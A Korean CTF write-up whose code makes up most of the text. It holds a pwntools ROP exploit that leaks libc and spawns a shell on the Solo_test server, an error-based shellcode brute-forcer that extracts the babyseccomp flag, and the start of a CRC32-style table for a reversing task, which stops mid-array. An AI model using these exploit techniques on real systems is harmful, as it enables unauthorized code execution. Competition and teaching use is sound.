# Christmas CTF

## 1. Solo_test

간단한 ROP이다.

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>remote(<span style="color:#63a35c">'115.68.235.72'</span>,<span style="color:#0099cc">1337</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">e<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>ELF(<span style="color:#63a35c">'./solo_test'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">libc<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>e.libc</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">sla<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.sendlineafter</div><div style="padding:0 6px; white-space:pre; line-height:130%">sa<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>r.sendafter</div><div style="padding:0 6px; white-space:pre; line-height:130%">pr<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0099cc">0x0000000000400b83</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">answer<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>[<span style="color:#63a35c">'Me'</span>,<span style="color:#63a35c">'No'</span>,<span style="color:#63a35c">'CTF'</span>,<span style="color:#63a35c">'Never'</span>,<span style="color:#63a35c">'No'</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;<span style="color:#066de2">range</span>(<span style="color:#066de2">len</span>(answer)):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;sla(<span style="color:#63a35c">'&gt;&gt;'</span>,answer[i])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'A'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">0x58</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(pr)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.got[<span style="color:#63a35c">'puts'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'puts'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.symbols[<span style="color:#63a35c">'solo'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">sla(<span style="color:#63a35c">'--&gt;'</span>,payload)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">leak<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>u64(r.recvuntil(<span style="color:#63a35c">'\x7f'</span>).replace(<span style="color:#63a35c">'\x20'</span>,<span style="color:#63a35c">''</span>).ljust(<span style="color:#0099cc">8</span>,<span style="color:#63a35c">'\x00'</span>))<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span><span style="color:#0099cc">0x83cc0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">log.info(hex(leak))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'A'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">0x58</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(leak<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0099cc">0x106ef8</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">sla(<span style="color:#63a35c">'--&gt;'</span>,payload)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.interactive()</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>


## 2. babyseccomp

![image-20191231000632183](https://github.com/aht7525/aht7525.github.io/blob/master/img/image-20191231000632183.png?raw=true)

mmap이 안걸려 있다.

mmap으로 맵핑하고 Error based shellcoding 하면 될거 같아

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div><div style="line-height:130%">32</div><div style="line-height:130%">33</div><div style="line-height:130%">34</div><div style="line-height:130%">35</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">import</span>&nbsp;string</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">context.arch&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#63a35c">'amd64'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#context.log_level="error"</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">flag&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#63a35c">'XMAS{'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;<span style="color:#066de2">range</span>(<span style="color:#0099cc">5</span>,&nbsp;<span style="color:#0099cc">100</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">for</span>&nbsp;j&nbsp;<span style="color:#a71d5d">in</span>&nbsp;string.printable:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;&nbsp;shellcraft.mmap(<span style="color:#0099cc">0</span>,&nbsp;<span style="color:#0099cc">0x1000</span>,&nbsp;<span style="color:#0099cc">1</span>,&nbsp;<span style="color:#0099cc">1</span>,&nbsp;<span style="color:#0099cc">3</span>,&nbsp;<span style="color:#0099cc">0</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#999999">#p&nbsp;=&nbsp;remote("115.68.235.72",&nbsp;23457)</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;process(<span style="color:#63a35c">'./babyseccomp'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#63a35c">''</span><span style="color:#63a35c">'\</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;go:</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;bl,&nbsp;[rax&nbsp;+&nbsp;{}]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;what:</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rcx,&nbsp;{}</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;rbx,rcx</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,0xdeadbeef</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;go</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;what</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'</span><span style="color:#63a35c">''</span>.<span style="color:#066de2">format</span>(i,&nbsp;ord(j))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.sendafter(<span style="color:#63a35c">':&nbsp;'</span>,&nbsp;asm(shellcode))</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">try</span>:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.recvuntil(<span style="color:#63a35c">"Seg"</span>,&nbsp;timeout<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0099cc">2</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;j</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>&nbsp;flag</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.<span style="color:#066de2">close</span>()</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">except</span>:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.<span style="color:#066de2">close</span>()</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
참고 : http://ipwn.kr/index.php/2019/07/01/isitdtu-ctf-2019-write-up/



## 3. Welcome_rev

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div><div style="line-height:130%">32</div><div style="line-height:130%">33</div><div style="line-height:130%">34</div><div style="line-height:130%">35</div><div style="line-height:130%">36</div><div style="line-height:130%">37</div><div style="line-height:130%">38</div><div style="line-height:130%">39</div><div style="line-height:130%">40</div><div style="line-height:130%">41</div><div style="line-height:130%">42</div><div style="line-height:130%">43</div><div style="line-height:130%">44</div><div style="line-height:130%">45</div><div style="line-height:130%">46</div><div style="line-height:130%">47</div><div style="line-height:130%">48</div><div style="line-height:130%">49</div><div style="line-height:130%">50</div><div style="line-height:130%">51</div><div style="line-height:130%">52</div><div style="line-height:130%">53</div><div style="line-height:130%">54</div><div style="line-height:130%">55</div><div style="line-height:130%">56</div><div style="line-height:130%">57</div><div style="line-height:130%">58</div><div style="line-height:130%">59</div><div style="line-height:130%">60</div><div style="line-height:130%">61</div><div style="line-height:130%">62</div><div style="line-height:130%">63</div><div style="line-height:130%">64</div><div style="line-height:130%">65</div><div style="line-height:130%">66</div><div style="line-height:130%">67</div><div style="line-height:130%">68</div><div style="line-height:130%">69</div><div style="line-height:130%">70</div><div style="line-height:130%">71</div><div style="line-height:130%">72</div><div style="line-height:130%">73</div><div style="line-height:130%">74</div><div style="line-height:130%">75</div><div style="line-height:130%">76</div><div style="line-height:130%">77</div><div style="line-height:130%">78</div><div style="line-height:130%">79</div><div style="line-height:130%">80</div><div style="line-height:130%">81</div><div style="line-height:130%">82</div><div style="line-height:130%">83</div><div style="line-height:130%">84</div><div style="line-height:130%">85</div><div style="line-height:130%">86</div><div style="line-height:130%">87</div><div style="line-height:130%">88</div><div style="line-height:130%">89</div><div style="line-height:130%">90</div><div style="line-height:130%">91</div><div style="line-height:130%">92</div><div style="line-height:130%">93</div><div style="line-height:130%">94</div><div style="line-height:130%">95</div><div style="line-height:130%">96</div><div style="line-height:130%">97</div><div style="line-height:130%">98</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">dword<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>[<span style="color:#0099cc">0x0</span>,<span style="color:#0099cc">0x77073096</span>,<span style="color:#0099cc">0x0EE0E612C</span>,<span style="color:#0099cc">0x990951BA</span>,<span style="color:#0099cc">0x76DC419</span>,<span style="color:#0099cc">0x706AF48F</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0E963A535</span>,<span style="color:#0099cc">0x9E6495A3</span>,<span style="color:#0099cc">0x0EDB8832</span>,<span style="color:#0099cc">0x79DCB8A4</span>,<span style="color:#0099cc">0x0E0D5E91E</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x97D2D988</span>,<span style="color:#0099cc">0x9B64C2B</span>,<span style="color:#0099cc">0x7EB17CBD</span>,<span style="color:#0099cc">0x0E7B82D07</span>,<span style="color:#0099cc">0x90BF1D91</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x1DB71064</span>,<span style="color:#0099cc">0x6AB020F2</span>,<span style="color:#0099cc">0x0F3B97148</span>,<span style="color:#0099cc">0x84BE41DE</span>,<span style="color:#0099cc">0x1ADAD47D</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x6DE4EB</span>,<span style="color:#0099cc">0x0F4D4B551</span>,<span style="color:#0099cc">0x83D385C7</span>,<span style="color:#0099cc">0x136C9856</span>,<span style="color:#0099cc">0x646BA8C0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0FD62F97A</span>,<span style="color:#0099cc">0x8A65C9EC</span>,<span style="color:#0099cc">0x14015C4F</span>,<span style="color:#0099cc">0x63066CD9</span>,<span style="color:#0099cc">0x0FA0F3D63</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x8D080DF5</span>,<span style="color:#0099cc">0x3B6E20C8</span>,<span style="color:#0099cc">0x4C69105E</span>,<span style="color:#0099cc">0x0D56041E4</span>,<span style="color:#0099cc">0x0A2677172</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x3C03E4D1</span>,<span style="color:#0099cc">0x4B04D447</span>,<span style="color:#0099cc">0x0D20D85FD</span>,<span style="color:#0099cc">0x0A50AB56B</span>,<span style="color:#0099cc">0x35B5A8FA</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x42B2986C</span>,<span style="color:#0099cc">0x0DBBBC9D6</span>,<span style="color:#0099cc">0x0ACBCF940</span>,<span style="color:#0099cc">0x32D86CE3</span>,<span style="color:#0099cc">0x45DF5C75</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0DCD60DCF</span>,<span style="color:#0099cc">0x0ABD13D59</span>,<span style="color:#0099cc">0x26D930AC</span>,<span style="color:#0099cc">0x51DE003A</span>,<span style="color:#0099cc">0x0C8D75180</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0BFD06116</span>,<span style="color:#0099cc">0x21B4F4B5</span>,<span style="color:#0099cc">0x56B3C423</span>,<span style="color:#0099cc">0x0CFBA9599</span>,<span style="color:#0099cc">0x0B8BDA50F</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x2802B89E</span>,<span style="color:#0099cc">0x5F058808</span>,<span style="color:#0099cc">0x0C60CD9B2</span>,<span style="color:#0099cc">0x0B10BE924</span>,<span style="color:#0099cc">0x2F6F7C87</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x58684C11</span>,<span style="color:#0099cc">0x0C1611DAB</span>,<span style="color:#0099cc">0x0B6662D3D</span>,<span style="color:#0099cc">0x76DC4190</span>,<span style="color:#0099cc">0x1DB7106</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x98D220BC</span>,<span style="color:#0099cc">0x0EFD5102A</span>,<span style="color:#0099cc">0x71B18589</span>,<span style="color:#0099cc">0x6B6B51F</span>,<span style="color:#0099cc">0x9FBFE4A5</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0E8B8D433</span>,<span style="color:#0099cc">0x7807C9A2</span>,<span style="color:#0099cc">0x0F00F934</span>,<span style="color:#0099cc">0x9609A88E</span>,<span style="color:#0099cc">0x0E10E9818</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x7F6A0DBB</span>,<span style="color:#0099cc">0x86D3D2D</span>,<span style="color:#0099cc">0x91646C97</span>,<span style="color:#0099cc">0x0E6635C01</span>,<span style="color:#0099cc">0x6B6B51F4</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x1C6C6162</span>,<span style="color:#0099cc">0x856530D8</span>,<span style="color:#0099cc">0x0F262004E</span>,<span style="color:#0099cc">0x6C0695ED</span>,<span style="color:#0099cc">0x1B01A57B</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x8208F4C1</span>,<span style="color:#0099cc">0x0F50FC457</span>,<span style="color:#0099cc">0x65B0D9C6</span>,<span style="color:#0099cc">0x12B7E950</span>,<span style="color:#0099cc">0x8BBEB8EA</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0FCB9887C</span>,<span style="color:#0099cc">0x621F</span>,<span style="color:#0099cc">0x15DA2D49</span>,<span style="color:#0099cc">0x8CD37CF3</span>,<span style="color:#0099cc">0x0FBD44C65</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x4DB26158</span>,<span style="color:#0099cc">0x3AB551CE</span>,<span style="color:#0099cc">0x0A3BC0074</span>,<span style="color:#0099cc">0x0D4BB30E2</span>,<span style="color:#0099cc">0x4ADFA541</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x3895D7</span>,<span style="color:#0099cc">0x0A4D1C46D</span>,<span style="color:#0099cc">0x0D3D6F4FB</span>,<span style="color:#0099cc">0x4369E96A</span>,<span style="color:#0099cc">0x346ED9FC</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0AD678846</span>,<span style="color:#0099cc">0x0DA60B8D0</span>,<span style="color:#0099cc">0x44042D73</span>,<span style="color:#0099cc">0x33031DE5</span>,<span style="color:#0099cc">0x0AA0A4C5F</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x00D7CC9</span>,<span style="color:#0099cc">0x5005713C</span>,<span style="color:#0099cc">0x270241AA</span>,<span style="color:#0099cc">0x0BE0B1010</span>,<span style="color:#0099cc">0x0C90C2086</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x5768B525</span>,<span style="color:#0099cc">0x206F85B3</span>,<span style="color:#0099cc">0x0B966D409</span>,<span style="color:#0099cc">0x0CE61E49F</span>,<span style="color:#0099cc">0x5EDEF90E</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x29D9C998</span>,<span style="color:#0099cc">0x0B0D09822</span>,<span style="color:#0099cc">0x0C7D7A8B4</span>,<span style="color:#0099cc">0x59B33D17</span>,<span style="color:#0099cc">0x2EB40D81</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0B7BD5C3B</span>,<span style="color:#0099cc">0x0C0BA6CAD</span>,<span style="color:#0099cc">0x0EDB88320</span>,<span style="color:#0099cc">0x9ABFB3B6</span>,<span style="color:#0099cc">0x3B6E20C</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x74B1D29A</span>,<span style="color:#0099cc">0x0EAD54739</span>,<span style="color:#0099cc">0x9277AF</span>,<span style="color:#0099cc">0x4DB2615</span>,<span style="color:#0099cc">0x73DC1683</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0E3630B12</span>,<span style="color:#0099cc">0x94643B84</span>,<span style="color:#0099cc">0x0D6D6A3E</span>,<span style="color:#0099cc">0x7A6A5AA8</span>,<span style="color:#0099cc">0x0E40ECF0B</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x9309FF9D</span>,<span style="color:#0099cc">0x0A00AE27</span>,<span style="color:#0099cc">0x7D079EB1</span>,<span style="color:#0099cc">0x0F00F9344</span>,<span style="color:#0099cc">0x8708A3D2</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x1E01F268</span>,<span style="color:#0099cc">0x6906C2FE</span>,<span style="color:#0099cc">0x0F762575D</span>,<span style="color:#0099cc">0x806567CB</span>,<span style="color:#0099cc">0x196C3671</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x6E6B06E7</span>,<span style="color:#0099cc">0x0FED41B76</span>,<span style="color:#0099cc">0x89D32BE0</span>,<span style="color:#0099cc">0x10DA7A5A</span>,<span style="color:#0099cc">0x674ACC</span></div><div style="padding:0 